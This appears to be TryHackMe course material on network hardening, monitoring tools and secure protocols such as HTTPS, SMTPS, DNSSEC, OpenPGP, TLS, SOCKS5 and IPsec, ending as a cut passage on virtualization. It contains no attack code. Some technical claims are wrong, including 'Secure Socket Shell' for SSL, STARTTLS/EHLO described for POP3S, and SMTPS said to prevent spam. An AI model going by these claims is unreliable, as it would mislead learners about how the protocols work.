![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1dfafd4df7da34ff724093f1ad436c13.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1dfafd4df7da34ff724093f1ad436c13.png)

# Additional Techniques in an Enterprise Environment

A
 network device deployed in an enterprise environment generally provides
 an increased attack surface for an attacker to launch attacks. As 
enterprise environments include a variety of devices with different 
models, makes, and types, there are no definite rules to harden network 
devices; however, a few important ones are mentioned below:

- **Configuring port security**: This includes limiting the number of MAC addresses registered on a switch port and taking particular action
whenever unauthorised access is detected. Enabling port security enables an administrator that data is coming from a valid source and will be
forwarded to a legitimate receiver.
- **Preventing ARP spoofing**: ARP spoofing is one of the most common vectors for launching
man-in-the-middle attacks on the network. The threat can be mitigated by enabling static ARP tables and implementing MAC address filtering. You
can learn more about mitigating ARP spoofing [here](https://tryhackme.com/room/layer2).
- **Preventing rogue DHCP servers**: The attacker creates a spoofed DHCP server that can be later on used for assigning IPs to clients and
launching MITM attacks. Mitigation measures to prevent such attacks
include configuring static DHCP binding and ensuring no unknown devices
are added to a network through network mapping tools. You can learn more about DHCP [here](https://tryhackme.com/room/introtolan).
- **Enabling IPv6**: Unlike IPv4, IPv6 has built-in support of IPsec that can be used to
secure network communication and provide confidentiality, integrity, and authenticity. Moreover, this will help in protection against MITM, eavesdropping, and tampering of packets in transit.

A
 network device is configured with many options for protection against 
cyberattacks. We have discussed some of the most common and important 
ones in this task.

**Important Tools for Network Monitoring**

Network monitoring 
tools are enablers for maintaining the security and performance of 
networks. These tools use sophisticated algorithms and protocols to 
capture and analyse real-time network traffic. In addition, they enable 
network administrators to detect and troubleshoot problems such as 
bandwidth bottlenecks, network outages, and security threats. Some 
commonly used tools and their usage is mentioned below:

| Tool | Usage Description |
| --- | --- |
| [**Nagios**](https://assets.nagios.com/downloads/nagioscore/docs/nagioscore/4/en/quickstart.html) | A
 popular open-source software for monitoring systems, networks, and 
infrastructure. It provides real-time monitoring and alerting for 
various services and applications. |
| [SolarWinds Network Performance Monitor](https://documentation.solarwinds.com/en/success_center/npm/content/npm_installation_guide.htm) | A
 comprehensive network monitoring tool that provides real-time 
visibility into network performance and availability. It includes 
network mapping, automated network discovery, and customisable 
dashboards. |
| [**PRTG**](https://www.paessler.com/manuals/prtg/installation) | An
 all-in-one network monitoring tool that provides comprehensive 
performance and availability monitoring. It includes real-time traffic 
analysis, custom dashboards, and customisable alerts. |
| [**Zabbix**](https://www.zabbix.com/download) | A
 powerful open-source network monitoring tool that provides real-time 
network performance and availability monitoring. It includes features 
such as customisable dashboards, network mapping, and alerting. |

## **NETWORK SECURITY PROTOCALS**

**Introduction**

A network protocol specifies how two devices, or more precisely processes, communicate with each other.

A network protocol is a pre-defined set of rules and processes to 
determine how data is transmitted between devices, such as end-user 
devices, networking devices, and servers. The fundamental objective of 
all protocols is to allow machines to connect and communicate 
seamlessly, regardless of any difference in their internal design, 
structure, logic, or operation. In analogy, a networking protocol is 
like a “common language” that helps make communication possible among 
people with different native languages and from various parts of the 
globe.

**Application Layer**

In this part, we will 
learn the core technical concepts of various protocols. However, to 
proceed further, we must be very clear about the following two ideas, 
which are the hallmark of any protocol regardless of its functionality:

- Each protocol represents specific layers of the OSI or TCP/IP model and operates as per the functionality of that layer.
- TCP and UDP-based protocols operate on specific network ports.

### HTTPS Protocol

### Technical Overview - HTTPS

Hypertext Transfer Protocol Secure (HTTPS)
 is a client-server protocol; responsible for securely sending data 
between a web server (website) and a web browser (client side). It is an
 encrypted variant of HTTP which sends data in an unencrypted format.

HTTP
 would be enough to browse a website to learn about a company product; 
however, HTTPS is a must if you want to provide your credit card details
 to place an online order. HTTPS was developed to securely share 
sensitive information, including passwords, contact information and 
financial information, between web browsers and websites. Without HTTPS,
 secure online banking and online payment wouldn’t have been possible.

### Workflow - HTTPS

HTTPS
 uses its unencrypted counterpart, i.e., HTTP, and adds a layer of 
encryption. In this case, it is SSL/TLS (Secure Sockets Layer/Transport 
Layer Security); the rest of the workflow remains the same. So before 
proceeding forward, we will review how HTTP requests and responses 
operate in a typical client and server environment.

### Request and Response - HTTP

An HTTP request is made by a user agent (a browser or any other application sending requests through a web API
 (Application Programming Interface)). It is vice versa in the case of 
response. This request aims to access some resources on the remote web 
server, which is then responded to by the web server. The figure below 
shows a web browser sending an HTTP request to a web server, listening 
at TCP port 80.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/62d879ca8881dc59a9567a071b330322.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/62d879ca8881dc59a9567a071b330322.png)

The request might be `GET` to request a web page, an image, or a file. Other HTTP requests include `PUT` and `POST`, which send data to the web server, such as a value or a file. You can read more about HTTP in the [HTTP in Detail](https://tryhackme.com/room/httpindetail) room.

If an attacker can capture the network packets between the client and the server communicating over HTTP, they will be able to read their content as it is sent in cleartext.

### Request and Response - HTTPS

After our quick review of the HTTP request
 and response workflow, it is convenient to learn about HTTPS. Remember 
that the “S” in HTTPS is for the extra SSL/TLS layer of encryption added
 over HTTP.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a31d2f96d32754bdc8327df2dbd5491c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a31d2f96d32754bdc8327df2dbd5491c.png)

Even if an attacker can capture the network packets between the
 client and the server communicating over HTTPS, they will fail to read 
the contents of the TCP data due to encryption.

### Encryption Mechanism of HTTPS

As already mentioned, SSL/TLS provides the encryption layer of HTTPS.
 It relies on asymmetric encryption (public key cryptography) and 
symmetric encryption. Asymmetric encryption uses two keys, i.e., public 
key and private key; its rule is to negotiate the symmetric encryption 
algorithm and the secret key. The default port of HTTPS is 443. 
Encryption protects against interception and alteration of data, 
maintaining the confidentiality and integrity of exchanged traffic.

### FTPS Protocol

### Technical Overview - FTPS

File Transfer Protocol Secure (FTPS)
 is a communication protocol which is a refined and secure version of 
File Transfer Protocol (FTP). Initially, FTP was developed in 1971 and 
published as RFC 114. Additional improvements and various changes were 
published in RFC 765 and RFC 959.

FTP
 was designed as a client-server model; separate control/command and 
data connections between a client and a server are used, along with a 
username and password. In FTP, both authentication and data transfer 
take place in an unencrypted form between the client and the server; 
however, in FTPS, an encrypted channel is established.

### Workflow

FTPS
 is an extension of FTP, which adds TLS security to commands and data 
connections. It is necessary to get an overview of FTP to understand 
FTPS.

### Request and Response - FTP

As described earlier, FTP is based on the client-server model. It 
utilizes the following two communication channels between the client and
 the server.

- **Control Connection:** In this connection, an FTP client (such as Filezilla and CuteFTP) sends a connection request
(authentication) to the remote FTP server at the default FTP port, TCP
port 21. As the name implies, a control connection is used for sending
and receiving commands and responses.
- **Data Connection:** After authentication, this connection is used for transferring data (files and folders).

### FTP Connection Types

FTP has two modes:

1. Active modes
2. Passive mode

### Active Mode

In active connection mode, the client establishes the control 
connection to send commands/authentication parameters to the server. 
After authentication and upon the client’s request to initiate data 
transfer, the server establishes the data connection to the client to 
transfer the data. In brief:

1. The FTP client connects to the FTP server at TCP port 21 to establish a command connection.
2. The FTP server connects to the FTP client at TCP port 20 to establish a data connection.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/59598772945981811433970ce8335d51.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/59598772945981811433970ce8335d51.png)

It is worth mentioning that this type of connection is unsuitable in 
an environment where the client is behind a firewall, as it will block 
incoming connections to the client. In the case of a client behind a 
firewall, a passive connection would be necessary.

### Passive Mode

In passive connection mode, the client establishes the control and data connections. The client sends the `PASV`
 command to the server over the command channel; the server sends a 
random port to the client. As soon as the client receives the port 
number, the client establishes a connection to the provided port number 
so that the server can initiate the data transfer to the client.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9fb1d6121138d219f436d4650b030a8b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9fb1d6121138d219f436d4650b030a8b.png)

This type of connection works well when the client is behind the firewall.

### FTP Data Types

When data exchange between client and server takes place, the following type of data types are used:

- **ASCII/Type A**: This is the default type and is used
for text file transfers. If necessary, data is converted into 8-bit
ASCII before transmission and then converted back upon reception.
- **Image/Type I**: This is commonly referred to as the
binary mode. It uses byte-by-byte transmission. The recipient stores the received bytes upon reception.
- **EBCDIC/Type E**: It is suitable for text communication using the EBCDIC character set.
- **Local Type L n:** It is typically used for file transfer among machines that do not support 8-bit bytes transfer. Here `n` is a second parameter that represents byte size.

### Request and Response - FTPS

As the name implies, FTPS
 is an extension of FTP. It adds an encryption layer to transmit command
 and data channels between client and server securely. The following two
 methods are used to invoke security:

- **Implicit Connection**: In this connection, FTPS
client and server establish a link in which both command and data
channels are secured automatically with SSL encryption.
- **Explicit Connection**: The FTP client explicitly requests the server to invoke an SSL/TLS secured
session on port 21 and then continue data transfer based on a mutually
agreed authentication mechanism. With explicit connection, you can
choose which channel to encrypt by choosing among three modes of
communication for control and data channel, i.e., control only
encrypted, data only encrypted and both control and data encrypted.

The standard port for FTP and Explicit FTPS is 21, whereas it is 990 
in the case of Implicit FTPS. Adding FTPS protects against sniffing 
attacks against login information and data.

### SMTPS Protocol

### Technical Overview

Simple Mail Transfer Protocol Secure (SMTPS)
 is an extension of SMTP, which is used for email communication. We 
should not confuse SMTP with POP3. Although both are used for email 
communication, SMTP is an “Email Push Protocol” used to transfer email 
messages from the client to the server. In contrast, POP3 is used to 
download email messages from the server to the client. SMTPS is an 
extension of SMTP; it uses TLS/SSL to provide authentication, integrity,
 and confidentiality for transferred data. First, let’s review the SMTP 
protocol.

### SMTP Protocol

As described earlier, SMTP is
 an “Email Push Protocol” commonly used to transfer emails from an SMTP 
client to an SMTP server. SMTP is implemented in the following two 
models:

- **SMTP End-to-End:** This model is used for email communication between organizations. In this model, the sender-side SMTP client initiates an SMTP connection to the recipient’s SMTP server.
- **SMTP Store-and-Forward:** This model is used for
email communication within an organization. In this model,
the SMTP server will maintain the copy of the mail within itself (i.e.,
store) until the copy is forwarded to the receiver.

### SMTP Components

To understand the workflow of SMTP, we will study the following essential components of SMTP:

- **User Agent (UA):** UA is responsible for creating the email message and sending it to the Mail Transfer Agent (MTA).
- **Mail Transfer Agent (MTA):** MTA will transfer the email from the UA to the recipient MTA across the Internet (often, the MTA and Mail Delivery Agent are hosted on the same server).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0675230daa95a5bcfdaf2d9017de25b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0675230daa95a5bcfdaf2d9017de25b1.png)

### TLS Process in SMTPS

SMTPS
 is not a proprietary protocol; instead, it wraps SMTP inside TLS. You 
can say that SMTPS is similar to SMTP on the application layer, with an 
extension of TLS encryption at the transport layer. For encryption, the `STARTTLS` command is used between the email client and the email server.

Port 587 and 465 are both frequently used for SMTPS traffic. Mails 
transmitted using SMTP are not encrypted, so they are prone to sniffing 
attacks. Therefore, SMTPS is used to encrypt emails through TLS before 
transmission. In addition, SMTPS also forbid attackers from sending spam
 messages from compromised/vulnerable domains, exfiltration sensitive 
information, and conducting phishing attacks.

### POP3S Protocol

### Technical Overview - POP3S

Post Office Protocol Secure (POP3S)
 is an extension of the POP3 protocol; it is used for the encrypted 
retrieval of email messages from the email server to the email client. 
So first, let’s review the POP3 protocol.

### POP3 Protocol

In the previous section, we explored how SMTPS
 is used for secure email transmission. SMTP is not responsible for 
retrieving email messages; here, POP3 comes into play. POP3 is the 
latest POP version; it retrieves email messages from a Mail Delivery 
Agent (MDA) to a Mail User Agent (MUA).

### POP3 Components and Workflow

Like SMTP, POP3 has two components: client (MUA) and server (MDA). The steps are the following:

1. The email client establishes a connection to the email server.
2. The email client downloads all the queued emails from the email
server. (This is a default option; however, the client can select only
particular email messages to download.)
3. All emails are saved on the device that initiated the connection.
4. The email server deletes the email copy. (This is a default option; a client can choose not to download an email after it is retrieved.)

### Limitations of POP3

- **Emails are Processed Locally:** No synchronization of email messages across multiple devices. Protocol downloads the emails
on the currently logged-in device and usually deletes them from the
server.
- **Transmission in clear text:** The username and
password, along with the email messages, are sent in cleartext, which
makes them vulnerable to sniffing attacks.

### POP3S

As we conclude, POP3
 is considered weak from a security point of view. This requires an 
added layer of security; hence, POP3S comes into play. POP3S is an 
extension of POP3, which wraps the communications related to email 
messages within TLS. For this purpose, the client and server initiate 
the `STARTTLS` command, as shown in the figure below. After the `EHLO`, the POP3S server will trigger the switch to TLS. Note that `EHLO` stands for Extended HELO, where `HELO` is the command used to identify to the server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9532e1d438c7ad07222bcb3977a4376b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9532e1d438c7ad07222bcb3977a4376b.png)

The POP3S Protocol uses port 995, while POP3 uses port 110.

**Application Layer - More Secure Protocols**

### DNSSEC

As you would already know, DNS
 stands for Domain Name System. The DNS protocol is responsible mainly 
for resolving domain names. Instead of remembering the IP address, you 
need to focus on the domain name. For instance, at the time of this 
writing, `example.com` resolves to `93.184.216.34`; it is clear which one is easier for the human mind to remember.

DNS works by sending a DNS query. For instance, when browsing the web, your web browser might send a query for DNS record type `A` or `AAAA`, i.e., IPv4 or IPv6 addresses. In the following console output, we can see the host with IP address `192.168.0.102` sending two DNS queries to the DNS server `1.0.0.1` regarding the domain name `example.com`. We can see the responses for the `A` and `AAAA` queries.

Terminal

```
user@TryHackMe$ sudo tshark port 53    1 0.000000000 192.168.0.102 → 1.0.0.1DNS 82 Standard query 0x2717 A example.com OPT
    2 0.012241216      1.0.0.1 → 192.168.0.102 DNS 98 Standard query response 0x2717 A example.com A 93.184.216.34 OPT
    3 0.013454645 192.168.0.102 → 1.0.0.1      DNS 82 Standard query 0xac05 AAAA example.com OPT
    4 0.018705620      1.0.0.1 → 192.168.0.102 DNS 110 Standard query response 0xac05 AAAA example.com AAAA 2606:2800:220:1:248:1893:25c8:1946 OPT
```

This name-to-IP address resolution is very convenient; however, 
anyone on the network could have responded with a forged response. 
Furthermore, the host that sent the query would have accepted “any” 
response. In other words, the host would connect to a rogue server. One 
way to avoid such a situation would be by using DNSSEC.

DNSSEC
 makes it possible to ensure that the DNS response we receive is from 
the domain owner. To achieve this, DNSSEC requires two main things:

1. The DNS zone owner should sign all DNS records using their private key.
2. The DNS zone publishes its public key so users can check the validity of the DNS records signatures.

In other words, the data to our DNS query is signed to ensure its integrity and authenticity; moreover, we can efficiently check the signature.

With signed records, DNSSEC provides the following:

- Authenticity: You can confirm that a certain DNS owner has authored and sent the record. Authenticity is possible
because the received record is signed by the DNS owner’s private key.
- Integrity: You can ensure that no changes have been made to the
record on its way. Any changes to the record will render its signature
invalid.

### OpenPGP

When the first email was sent in 1971, we had a different cyber security landscape. Email protocols such as SMTP
 and POP3 are designed to send emails in cleartext. The same applies to 
IMAP, which allows synchronizing your mailbox with that on the server. 
All these protocols make your email no different than an exposed 
postcard open for everyone to see as it is handed from one server to 
another.

The image below shows a simplified example where a user uses an email client to send their email over SMTP
 and receive new email messages over POP3 or IMAP. The mail server uses 
SMTP to deliver the user’s email messages to the intended recipient. 
Since all these protocols use clear text, an intruder can read the email
 messages as they travel across the Internet.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6cf8953835d91c3889ec3e51dbb20b21.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6cf8953835d91c3889ec3e51dbb20b21.png)

With the increased popularity of web-based email, users started
 to connect to a web server to read and compose their email messages. 
The image below shows an email message as it is written using a web 
browser. The web server, in turn, uses a mail server to send composed 
email messages and receive incoming ones. The connection was over HTTP, which meant that the same security issues related to confidentiality and integrity persisted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23da18a37a955ab916250d3f2a5496b8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23da18a37a955ab916250d3f2a5496b8.png)

However, as service providers realized the need for SSL/TLS to 
secure web traffic, HTTPS became the new standard. Consequently, most 
web-based email systems migrated to HTTPS, causing the traffic between 
the web browser and the web server to be encrypted. However, the email 
traffic is not necessarily encrypted between the web server and the mail
 server(s). The web server and mail servers can read the contents of the
 messages; moreover, mail servers might use SMTP to transfer the messages, which means that email messages will traverse the Internet in cleartext.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/55d996d0d8b73b61232db81e51c45cb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/55d996d0d8b73b61232db81e51c45cb5.png)

Eventually, SSL/TLS started to find their way into all email protocols. SMTP, POP3, and IMAP became SMTPS, POP3S, and IMAPS, respectively. The “S” added to the protocol name refers to **secure**, indicating the addition of SSL/TLS on top of the existing protocol.

The image below shows a simplified example where a mail client uses 
SMTPS to send an email and uses POP3S or IMAPS to receive an email. The 
result is that email is sent encrypted between the client and the 
server; however, the mail server can read the email message contents.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ad9e412e946ecbe7b8aa82ccdb55cb42.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ad9e412e946ecbe7b8aa82ccdb55cb42.png)

The addition of SSL/TLS has dramatically enhanced the security of 
email messages. However, we must still trust the mail servers across the
 way. If this is not something you are comfortable with, you need to 
consider a standard such as OpenPGP. PGP (Pretty Good Privacy) is an 
encryption program created by Phil Zimmerman. OpenPGP is an **open standard** for signing and encrypting files and email messages and is detailed in [RFC 4880](https://www.rfc-editor.org/rfc/rfc4880). GnuPG (Gnu Privacy Guard), or simply GPG,
 is a free and open-source implementation of the OpenPGP standard. In 
brief, GnuPG allows you to sign and encrypt your data and 
communications.

GnuPG can easily integrate with your mail client to seamlessly sign, 
encrypt and decrypt email messages. Email messages encrypted using GnuPG
 (i.e., following OpenPGP standard) be only readable by the intended 
recipient. In other words, no one, including the mail servers, can read 
the contents of the messages except the intended recipient.

When used with email, GnuPG requires each user to generate a key 
pair: a private key and a public key. In simple terms, the sender’s 
private key is used for signing, while the recipient’s public key is 
used for encryption. From the recipient’s perspective, the sender’s 
public key is used to check the signature, while the recipient’s private
 key is used for decryption. For more information about asymmetric 
encryption, we recommend you check the [Introduction to Cryptography](https://tryhackme.com/room/cryptographyintro) room.

OpenPGP implementations, such as GnuPG, offer a great solution to 
protect the confidentiality and integrity of email message contents. 
However, this does not include email message headers.

Below is an example of a message before and after being encrypted using OpenPGP. The original message is shown below.

Terminal

```
user@TryHackMe$ cat message.txtHello,

Please proceed with the transaction.

Best,
Strategos
```

To use OpenPGP, both parties need to generate a key pair using the command `gpg --gen-key`.
 This command will ask the user to provide their name and email address 
and create a private and public key. The private key should be stored 
securely, while the public key should be shared with the other parties 
we wish to communicate securely with.

Using an email client that supports OpenPGP will encrypt the message 
using the key of the recipient; however, if we want to accomplish this 
via the command line, the command would be something like the following:

`gpg --encrypt --sign --armor -r strategos@tryhackme.thm message.txt`

Notice the following options:

- `-encrypt -r recipient@tryhackme.thm` will encrypt `message.txt` using the public key associated with the recipient’s email. This will provide confidentiality.
- `-sign` will sign our message (using our private key). This will prove authenticity.
- `-armor` is to produce the output using ASCII instead of binary.

Encrypting using `gpg` created the following message that can be sent seamlessly with an email client.

Terminal

```
user@TryHackMe$ cat message.txt.asc-----BEGIN PGP MESSAGE-----

hF4Dt1Jduipo/LESAQdAmqgCLQRRQCFNOBWSF+dY64suA8xtty7ysfolfF7+fnUw
crwR2ioRTcXTe6c0dZl/sdmtjDJPZWGHI3XcD7XWA2hPDb+w4P46e9FJGsCE/JaO
1I4BCQIQZc91A79Ebli/41D0aVkBmDpjIgvpwjHdmomT7dghTcB+Qp80WbYDnV20
4qTgdgdAnLtQp3fnJCXlZ0BfecPB+ZfECdD1IAleBB3o14v5v/ntfPKfXPZwODUm
ELY7piC2GclBWbirrZsnzTLWeYCrABiKJ3Rb75VgJXdM1uKNBY0HLN06VdEuDy+L
=nRQE
-----END PGP MESSAGE-----
```

### SSH

With the beginning of networked systems, there was a need to connect 
to a system over a network. For instance, a user needs to execute 
processes and administer the system. The aim was to do this remotely 
instead of being physically present at the computer.

Two of the earliest protocols were Telnet and remote login, with the clients `telnet` and `rlogin`,
 respectively. Both protocols made it possible to log in to a system 
over a network; however, neither focused on the security aspects. The 
confidentiality of the exchanged traffic, especially the login 
credentials, was not protected. Moreover, the integrity of the traffic 
and commands sent was not ensured. In other words, it was easy for an 
attacker monitoring the network to read the login credentials and modify
 the commands sent over the network.

The screenshot below is taken from Wireshark after using “Follow TCP Stream” against a Telnet session. We can see the user typing his username `michael` and pasting his password `RJ9wn^t3T%gC`.
 Although the password is secure by modern standards, it is sent in 
cleartext for any properly located network packet-capturing software to 
read. Note that in the image below, the text in red is sent by the 
Telnet client, while the text in blue is sent by the Telnet server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/98790dac90da302dc620fa46fc653985.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/98790dac90da302dc620fa46fc653985.png)

The Secure Shell Protocol (SSH)
 provided the security requirements lacking in Telnet and remote login. 
With SSH, it is no longer feasible for the attacker to read the login 
credentials or modify the traffic. If we attempt to “Follow TCP Stream” 
on Wireshark after capturing the packets, we won’t get any information 
regarding the username, password, or issued commands. The screenshot 
below shows that the only visible information is the version numbers and
 the supported protocols. (Please note that the red characters are sent 
by the client, while the blue characters are sent by the server.)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d0b6ca8ff1fd74de700084f166b27223.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d0b6ca8ff1fd74de700084f166b27223.png)

**Presentation and Session Layers**

### SSL/TLS Protocol

### Technical Overview - SSL/TLS

Secure Socket Shell (SSL) and Transport Layer Security (TLS) 
are protocols used to encrypt data exchanged between a client, such as a
 web browser, and a server. Consider SSL/TLS as a wrapper that encrypts 
various communication protocols, such as HTTP and FTP, to create HTTPS and FTPS. SSL is not commonly used nowadays as TLS has been gradually replacing it.

### SSL/TLS Workflow

SSL/TLS handshake is performed to encrypt the communication between client and server through the following steps:

1. Client Hello Message: The client sends a hello message to the
server; it includes the client TLS version and the cypher suite that the client supports, in addition to random bytes.
2. Server Hello Message: The server responds with a hello message,
highlighting its certificate, chosen cypher suite and random bytes.
3. Authentication: The client authenticates the server’s certificate
through the certificate authority that issued it. For example, when we
visit [Google](https://www.google.com/), Google shares its
certificate. The received certificate is verified by our browser, which
is pre-installed with the certificates of various certificate
authorities.
4. Premaster Secret: The client encrypts random bytes with the server’s public key. (The client retrieves the public key from the server’s
certificate.)
5. Decryption of Premaster: The server decrypts the premaster with its private key.
6. Session Keys Generated: The client and the server generate session
keys based on client random bytes, random server bytes and premaster
secret. Both will arrive at the same results; **this session key is not transmitted**, and encryption and decryption are based on this key.
7. Ready Messages: The client and server send a “finished” message
using the session key to indicate that the session is ready for
transmission. The client and server are now ready to exchange messages
over SSL/TLS encrypted connection.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1a7e8eaf28b773aab4b5d3ae0f563b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1a7e8eaf28b773aab4b5d3ae0f563b6.png)

TLS is a wrapper that encrypts communication of communication 
protocols. It has port numbers for various protocols, such as 443 for 
HTTPS and 990 for FTPS.

### SOCKS5 Protocol

### Technical Overview - SOCKS5

Socket Secure (SOCKS) is a proxy protocol for data exchange 
through a delegate server (SOCKS5 proxy). It is used to secure 
application layer protocols. For example, the Squid server implements 
the SOCKS5 protocol to transfer data via the HTTP protocol.

### SOCKS5 Workflow

Consider a scenario when user A wants to connect with client B over 
the Internet, but a firewall is between them. The following handshake 
steps are involved:

- **Client Initiation**
    - Client A connects with the SOCKS5 proxy and sends the first byte (0x05) to the proxy where “5” is the SOCKS version.
    - Client A sends a second byte (0x01). One means authentication is supported.
    - Client A sends the third byte (0x00, 0x01, 0x02, or 0x03); these
    bytes denote the supported authentication methods and can be of variable length.
- **SOCKS5 Proxy Reply**
    - The proxy sends back a second byte, which is the chosen authentication method by the proxy server.
    - After the initiation packet, client A sends the request packet, which includes BHOST & BPORT numbers.
    - The successful session is established between client A and the
    proxy. The same steps are involved in the association of client B with
    the proxy.
- **Data Transfer**
    - After successfully associating both clients with a proxy server,
    both clients can exchange data and share information that will be routed through the proxy server.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3814e1abc3946c5f256e5b9aa7eff893.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3814e1abc3946c5f256e5b9aa7eff893.png)

### Benefits of SOCKS5

- In direct communication via the proxy server, hide the internal details from routing over the Internet.
- A proxy acts as a relay server, bypassing Internet censorship based on the client’s IP address.

**Network Layer**

### IPsec

IPsec stands for Internet Protocol Security. In this room, we use 
IPsec to refer to IPsec-v3. IPsec provides security by adding 
authentication and protecting the integrity and confidentiality of the 
network traffic. IPsec uses the following protocols:

1. Authentication Header (AH): Provides authentication and integrity.
2. Encapsulating Security Payload (ESP): Provides authentication, integrity, and confidentiality.
3. Security Association (SA): Is responsible for negotiating the
encryption keys and algorithms. One example is Internet Key Exchange
(IKE). Discussing SA in more detail is outside the scope of this room.

In the following sections, we discuss AH and ESP in more detail.

### Authentication Header (AH)

Authentication Header (AH): The AH protocol is responsible for the 
authentication and the integrity of the traffic; however, it cannot 
protect the confidentiality of the data.

The AH protocol works in two modes, as shown in the figure below:

1. Transport Mode: Provides authentication for the TCP/UDP header and data.
2. Tunnel Mode: Provides authentication for the IP header, TCP/UDP header, and data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d33c96d4525b25694790be6ff0c31d8e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d33c96d4525b25694790be6ff0c31d8e.png)

The AH protocol is suitable if providing authentication and integrity
 is enough without confidentiality. It is worth mentioning that AH is 
optional in IPsec-v3; however, it is mandatory to implement in IPsec-v2.

### Encapsulating Security Payload (ESP)

Encapsulating Security Payload (ESP) provides encryption in addition to authentication and integrity. It works in two modes:

1. Transport Mode: Provides security (confidentiality and integrity) for the TCP/UDP header and data.
2. Tunnel Mode: Provides security (confidentiality and integrity) for the IP header, TCP/UDP header, and data.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f8c38bc132212830e305f2bf19185a55.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f8c38bc132212830e305f2bf19185a55.png)

### VPN

When the TCP/IP protocol was designed, security requirements 
such as confidentiality and integrity were not a design target. In 
contrast, availability was the priority as one of the purposes of the 
Internet is to withstand a nuclear attack, as is evident by the routing 
protocols adapting quickly when a link goes down. But we need to allow a
 corporation to use the existing Internet infrastructure to connect its 
offices securely. The answer lies in setting up a VPN.

A Virtual Private Network (VPN)
 makes it possible to establish a private connection over a public 
network. In other words, we can establish a secure connection over an 
insecure infrastructure.

For instance, in the figure below, we can see a remote office and a remote user connected over a VPN
 to the main office. A VPN connection requires a VPN client and a VPN 
server or concentrator. All the traffic between the VPN client and 
server is encrypted.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/898973f759258b860a457724055fae7b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/898973f759258b860a457724055fae7b.png)

The two most common protocols used to establish VPN connections are:

1. IPsec
2. SSL/TLS

IPsec’s ESP is a perfect protocol for setting up secure tunnels
 between different networks or a computer and a network. ESP can provide
 security and integrity of all data transmitted between two points; 
moreover, even the IP address can be hidden in tunnel mode. Note that 
the system must be behind a VPN concentrator for the IP address to be hidden. Cisco VPN systems offer IPsec.

Although SSL was created to secure HTTP
 traffic, SSL/TLS has found its way to establish secure VPN connections 
with OpenVPN. Using various tools and libraries built around TLS, 
OpenVPN offers different authentication and encryption mechanisms to 
establish VPN connections.

Some older protocols that can be used to establish VPN
 connections are no longer considered secure. One example is Point to 
Point Tunneling Protocol (PPTP), which is no longer considered secure.

## **VIRTUALIZATION AND CONTAINERS**

**What is Virtualization**

At
 its most basic level, virtualization is the concept of encapsulating 
the capabilities and features of a physical machine in a virtual 
environment, known as a **virtual machine**.

But why is virtualization needed? For most organizations and individuals, virtualization comes from a need of the following:

- **Decrease expenses:** Physical servers can be
expensive, and virtualization can decrease the number of servers or
other hardware, or even completely remove physical hardware from a
company's infrastructure.
- **Scale:** Without properly implemented DevOps, it may
be hard for a company to scale resources as server usage increases.
Virtualization makes this process easier and can delegate a server's
resources to virtual machines as needed based on usage.
- **Efficiency:** Like scaling, virtualization can also
make it easier to decrease the resources allocated to a virtual machine
if there is reduced usage.

# Virtualization Technology

At
 this point, you may be asking how virtualization is possible; while 
this is an intricate question, in this room, we will break down 
different technologies and platforms, briefly looking at how they 
